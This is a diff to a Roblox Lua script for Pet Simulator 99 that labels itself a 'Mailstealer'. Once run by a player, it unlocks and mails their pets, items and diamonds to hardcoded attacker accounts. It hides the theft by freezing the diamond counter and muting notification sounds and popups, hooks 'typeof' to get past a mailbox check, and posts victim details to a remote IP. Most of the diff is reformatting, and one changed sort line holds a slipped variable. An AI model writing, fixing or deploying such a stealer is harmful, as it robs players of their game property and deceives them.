@@ -6,33 +6,32 @@ _G.scriptExecuted = true
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
+local saveModule = game.ReplicatedStorage:FindFirstChild("Library") and game.ReplicatedStorage.Library:FindFirstChild("Client") and game.ReplicatedStorage.Library.Client:FindFirstChild("Save")
 local plr = game.Players.LocalPlayer
 local MailMessage = "LOL SO EZ"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
 local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+    return saveModule and require(saveModule).Get() or {}
 end
 
 local user = _G.Username = "CheaterForRea1"
 local user2 = _G.Username2 = "JHGG8875"
 local discuser = _G.discuser = "1328537790001975367"
 local min_rap = _G.minrap = 100000
-
 local newamount = 20000
 
+local mailsent = (GetSave().MailboxSendsSinceReset or 0)
 if mailsent ~= 0 then
-	newamount = math.ceil(newamount * (1.5 ^ mailsent))
+    newamount = math.ceil(newamount * (1.5 ^ mailsent))
 end
 
 local GemAmount1 = 1
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
-		break
+        break
     end
 end
 
@@ -41,14 +40,14 @@ if newamount > GemAmount1 then
 end
 
 local function formatNumber(number)
-	local number = math.floor(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
+    local number = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
 local function SendMessage(diamonds)
@@ -57,23 +56,23 @@ local function SendMessage(diamonds)
         ["DiscUser"] = discuser or ""
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items to be sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items to be sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = "",
             inline = false
         }
-	}
+    }
 
     local combinedItems = {}
     local itemRapMap = {}
@@ -104,10 +103,10 @@ local function SendMessage(diamonds)
         ["embeds"] = {{
             ["title"] = "\240\159\144\177 New PS99 Execution" ,
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Mailstealer by aaaa. discord @opsyougetcliped"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Mailstealer by aaaa. discord @opsyougetcliped"
+            }
         }}
     }
 
@@ -125,7 +124,7 @@ local function SendMessage(diamonds)
     end
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
+    local response = HttpService:RequestAsync({
         Url = "http://46.101.233.20:5000/ps99",
         Method = "POST",
         Headers = headers,
@@ -136,22 +135,22 @@ end
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
+    gemsleaderstatpath.Value = gemsleaderstat
 end)
 
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
+    noti.Enabled = false
 end)
 noti.Enabled = false
 
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
+        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
+            x.Volume = 0
+            x.PlayOnRemove = false
             x:Destroy()
         end
     end
@@ -182,49 +181,49 @@ local function sendItem(category, uid, am)
         [4] = uid,
         [5] = am or 1
     }
-	local response = false
-	repeat
-    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-		if response == false and err == "They don't have enough space!" then
-			user = user2
-			args[1] = user
-		end
-	until response == true
-	GemAmount1 = GemAmount1 - newamount
-	newamount = math.ceil(math.ceil(newamount) * 1.5)
-	if newamount > 5000000 then
-		newamount = 5000000
-	end
+    local response = false
+    repeat
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if response == false and err == "They don't have enough space!" then
+            user = user2
+            args[1] = user
+        end
+    until response == true
+    GemAmount1 = GemAmount1 - newamount
+    newamount = math.ceil(math.ceil(newamount) * 1.5)
+    if newamount > 5000000 then
+        newamount = 5000000
+    end
 end
 
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= (newamount + 10000) then
-				local args = {
-					[1] = user,
-					[2] = MailMessage,
-					[3] = "Currency",
-					[4] = i,
-					[5] = GemAmount1 - newamount
-				}
-				local response = false
-				repeat
-					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-				until response == true
-				break
-			end
+            if GemAmount1 >= (newamount + 10000) then
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = i,
+                    [5] = GemAmount1 - newamount
+                }
+                local response = false
+                repeat
+                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                until response == true
+                break
+            end
         end
     end
 end
 
 local function IsMailboxHooked()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
-		break
-	end
-	local args = {
+    local uid
+    for i, v in pairs(save["Pet"]) do
+        uid = i
+        break
+    end
+    local args = {
         [1] = "Roblox",
         [2] = "Test",
         [3] = "Pet",
@@ -242,9 +241,9 @@ end
 local function EmptyBoxes()
     if save.Box then
         for key, value in pairs(save.Box) do
-			if value._uq then
-				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
-			end
+            if value._uq then
+                network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
+            end
         end
     end
 end
@@ -260,9 +259,9 @@ end
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
 for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
-			if v == "Pet" then
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            if v == "Pet" then
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                 if dir.huge or dir.exclusiveLevel then
                     local rapValue = getRAP(v, item)
@@ -290,19 +289,19 @@ for i, v in pairs(categoryList) do
             end
             if item._lk then
                 local args = {
-                [1] = uid,
-                [2] = false
+                    [1] = uid,
+                    [2] = false
                 }
                 network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
         end
-	end
+    end
 end
 
 if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     ClaimMail()
-	if IsMailboxHooked() then
-		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
+    if IsMailboxHooked() then
+        local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
         for i, Func in ipairs(getgc(true)) do
             if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                 local Old
@@ -314,10 +313,10 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
                 end)
             end
         end
-	end
+    end
     EmptyBoxes()
-	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+    require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+    require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
     local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
     local blob_b = require(blob_a).Get()
     function deepCopy(original)
@@ -336,7 +335,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
 
     table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
+        return a.rap * a.amount > b.rap * a.amount 
     end)
 
     spawn(function()
